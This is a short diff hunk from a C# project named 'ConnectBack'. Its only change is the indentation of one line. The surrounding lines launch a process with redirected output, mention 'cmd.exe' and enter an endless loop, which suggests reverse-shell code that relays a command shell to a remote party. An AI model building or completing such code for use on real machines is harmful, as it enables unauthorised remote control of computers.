@@ -36,7 +36,7 @@ namespace ConnectBack
 						p.StartInfo.RedirectStandardError = true;
 						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
 						// p.Start("cmd.exe","test","test",x,"test");
-									p.Start();
+						p.Start();
 						p.BeginOutputReadLine();
 
 						while (true)
